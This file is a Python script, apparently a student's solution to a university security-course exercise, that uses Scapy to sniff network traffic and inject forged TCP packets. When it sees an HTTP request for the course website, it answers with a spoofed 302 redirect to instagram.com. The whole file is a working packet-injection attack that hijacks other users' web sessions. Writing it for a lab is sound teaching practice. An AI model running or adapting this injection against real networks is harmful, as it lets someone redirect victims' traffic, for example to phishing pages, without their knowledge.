import q1
import scapy.all as S


RESPONSE = '\r\n'.join([
    r'HTTP/1.1 302 Found',
    r'Location: https://www.instagram.com',
    r'',
    r''])


WEBSITE = 'infosec.cs.tau.ac.il'


def get_tcp_injection_packet(packet):
    """
    If the given packet is an attempt to access the course website, create a
    IP+TCP packet that will redirect the user to instagram by sending them the
    `RESPONSE` from above.
    """
    # Get the packet as string
    tcp_as_string = bytes(packet[S.TCP].payload).decode() 
    if ("Host: "+WEBSITE) in tcp_as_string: 
        ip_destination = packet[S.IP].src
        ip_source = packet[S.IP].dst
        l1 = S.IP(dst=ip_destination, src=ip_source) 
        
        source_port = packet[S.TCP].dport
        des_port = packet[S.TCP].sport
        source_seq = packet[S.TCP].ack
        des_ack = packet[S.TCP].seq+len(packet[S.TCP].payload)
        l2 = S.TCP(sport=source_port, dport=des_port, flags='AF', seq=source_seq, ack=des_ack)
        tcp_as_string = S.Raw(load=RESPONSE)
        
        inject_packet = l1/l2/tcp_as_string
        return inject_packet
    
    return 0 


def injection_handler(packet):
    # WARNING: DO NOT EDIT THIS FUNCTION!
    to_inject = get_tcp_injection_packet(packet)
    if to_inject:
        S.send(to_inject)
        return 'Injection triggered!'


def packet_filter(packet):
    # WARNING: DO NOT EDIT THIS FUNCTION!
    return q1.packet_filter(packet)


def main(args):
    # WARNING: DO NOT EDIT THIS FUNCTION!
    if '--help' in args or len(args) > 1:
        print('Usage: %s' % args[0])
        return

    # Allow Scapy to really inject raw packets
    S.conf.L3socket = S.L3RawSocket

    # Now sniff and wait for injection opportunities.
    S.sniff(lfilter=packet_filter, prn=injection_handler)


if __name__ == '__main__':
    import sys
    main(sys.argv)
